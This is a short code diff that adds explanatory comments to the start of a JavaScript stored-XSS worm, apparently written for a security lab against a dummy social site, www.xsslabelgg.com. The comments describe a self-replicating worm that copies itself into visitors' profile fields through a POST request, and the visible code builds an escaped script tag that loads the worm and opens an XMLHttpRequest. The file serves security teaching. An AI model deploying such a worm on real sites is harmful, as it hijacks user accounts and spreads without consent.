@@ -1,3 +1,9 @@
+//A dummy social networking site www.xsslabelgg.com was used to perform a stored XSS attack in this case. 
+//The aim was to create a self replicating XSS worm. 
+//On accessing an infected page the script would generate a POST request that would copy the script to a field on the user's profile  
+//page.  
+//The next time someone else tried to access this user's profile their page would get infected as well and the cycle would continue.
+
 var Ajax=null;
 var scripttext = escape("<script type=\"text/javascript\" src=\"http://www.xsslabelgg.com/wormscript1.js\"></script>");
 Ajax=new XMLHttpRequest();
